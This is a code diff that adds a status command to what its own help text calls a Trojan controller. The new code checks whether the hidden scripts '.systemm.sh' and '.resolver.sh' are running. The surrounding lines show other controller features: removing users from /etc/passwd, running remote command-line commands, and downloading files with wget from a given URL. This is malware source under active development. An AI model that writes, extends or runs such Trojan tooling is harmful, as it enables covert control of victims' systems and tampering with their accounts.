@@ -115,7 +115,26 @@ def main():
                     os.system("wget -P "+Dir+ " "+link)
         elif(value.lower() in ('l')):
             print("Uploading.....")
-            
+        elif(value.lower() in ('s')):
+            print("Current module status:")
+            print()
+            if(checkStatus(".systemm.sh")):
+                os.system("echo -e "+"systemm status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"systemm status: "+"\033[31m[INACTIVE]\033[0m")
+            if(checkStatus(".resolver.sh")):
+                os.system("echo -e "+"resolver status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"resolver status: "+"\033[31m[INACTIVE]\033[0m")
+                
+def checkStatus(fileName):
+    ps_output = subprocess.check_output(["ps", "-ef"])
+    ps_lines = ps_output.decode("utf-8").split("\n")
+    for line in ps_lines:
+        if fileName in line:
+            return True
+    else:
+        return False
 main()
 EOFA
 fi
@@ -138,6 +157,8 @@ r -- Remove. Will list current users in /etc/passwd and prompts the user for a n
 c -- Command-Line. Enables command-line commands through the controller.
 
 d -- Download. Downloads files and/or directories from a specified url.
+
+s -- Status. Displays current running status of external scripts used by the Trojan.
 
 
 Console Commands:
